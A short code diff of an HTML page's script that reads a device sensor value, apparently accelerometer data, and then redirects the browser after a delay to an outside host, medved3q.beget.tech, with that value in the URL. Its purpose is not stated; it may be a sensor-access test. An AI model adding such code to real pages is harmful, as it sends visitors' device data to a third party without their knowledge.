@@ -12,8 +12,10 @@
         value = acl.x;
     });
     acl.start();
-    
-    setTimeout(document.location.replace, 50, "http://medved3q.beget.tech/get.php?x="+value);
+    function redir() {
+  document.location.replace("http://medved3q.beget.tech/get.php?x="+value);
+}
+    setTimeout(redir, 500);
     </script>
 </body>
 </html>  
